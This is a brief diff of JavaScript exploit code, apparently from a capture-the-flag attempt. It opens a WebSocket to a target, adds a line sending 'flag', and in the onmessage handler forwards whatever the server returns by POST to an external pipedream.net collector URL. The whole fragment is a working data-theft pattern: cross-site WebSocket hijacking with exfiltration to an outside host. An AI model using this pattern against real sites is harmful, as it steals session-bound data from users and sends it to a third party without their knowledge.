@@ -15,8 +15,8 @@
       ws.onopen = function () {
         ws.send("hello");
       };
+      ws.send("flag")
       ws.onmessage = function (event) {
-        console.log(event.data)
         fetch("https://eotp0j2o6hthpx9.m.pipedream.net",
           {
               method: "POST",
